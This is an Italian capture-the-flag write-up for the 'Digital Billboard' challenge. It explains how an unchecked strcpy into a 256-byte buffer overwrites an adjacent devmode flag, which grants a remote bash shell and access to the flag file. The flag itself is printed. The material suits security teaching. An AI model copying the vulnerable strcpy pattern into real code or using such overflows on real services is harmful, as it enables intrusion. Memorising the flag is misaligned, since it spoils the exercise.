# Writeup: SS_2.01 - Digital Billboard

## Overview
- **Categoria**: Binary (Remote Service)
- **Autore**: zxgio
- **Difficoltà**: 489
- **Stato**: Up (last checked: 16 minutes ago)
- **Servizio**: `nc billboard.challs.cyberchallenge.it 9120`

## Descrizione 📝
Il servizio remoto simula un "digital billboard" con alcuni comandi di base. Dal codice sorgente (fornito nella challenge) notiamo che la struttura `billboard` contiene:
```c
struct billboard {
    char text[256];
    char devmode;
};
struct billboard bb = { .text="Placeholder", .devmode=0 };
```
- `set_text <text>`: Copia `argv[1]` in `bb.text` tramite `strcpy`, senza controllare la lunghezza → **vulnerabile a buffer overflow**.
- `devmode`: Se impostato a 1, abilita la funzione `shell()` che esegue `/bin/bash`.

## Soluzione 🎯

### 1. Connessione al Servizio
```bash
nc billboard.challs.cyberchallenge.it 9120
```
Apparirà un prompt:
```
*
* Digital Billboard
*
We bought a new digital billboard for CTF advertisement.

Type "help" for help :)
>
```

### 2. Overflow per Impostare `devmode`
Il buffer `bb.text` ha lunghezza 256, ma `strcpy` non controlla i limiti. Se inviamo un input più lungo di 256 caratteri, sovrascriveremo la variabile `devmode` (il byte successivo) con un valore diverso da 0. Così abiliteremo la developer mode.

Esempio:
```text
> set_text AAAAAAAAAA... (256+ bytes)
Successfully set text to: AAAAAAAAAA... (lungo)
```
La sovrascrittura fa sì che `bb.devmode` diventi 1.

### 3. Attivazione di `devmode`
Ora eseguiamo:
```text
> devmode
Developer access to billboard granted.
```
A questo punto, il servizio esegue `system("/bin/bash")`, concedendoci una shell interattiva.

### 4. Lettura della Flag
All’interno della shell remota possiamo eseguire comandi:
```bash
ls
billboard.so
binary
flag.txt
cat flag.txt
CCIT{Digital Billboard from 34c3 Junior CTF - your_id}
```

## Flag 🏁
```
CCIT{Digital Billboard from 34c3 Junior CTF - your_id}
```

## Lezioni Apprese 📚
1. **Buffer Overflow Semplice**: L’uso di `strcpy` senza limiti su un array di dimensione fissa (`char text[256]`) porta a un classico stack-smashing o corruzione di variabili globali.
2. **Sovrascrittura di Variabili Vicine**: Se `devmode` è subito dopo `text`, un input eccessivo può settarlo a 1, concedendo privilegi elevati.
3. **Protezione Limitata**: Non esiste alcun check sulla lunghezza del testo inserito, consentendo l’overflow con facilità.

## Tools Utilizzati 🛠️
- **nc (netcat)**: Per connettersi al servizio remoto.
- **Codice Sorgente**: Per individuare la struttura e la vulnerabilità di `strcpy`.

---

*Writeup by Luca Crippa - Last Updated: 2024*
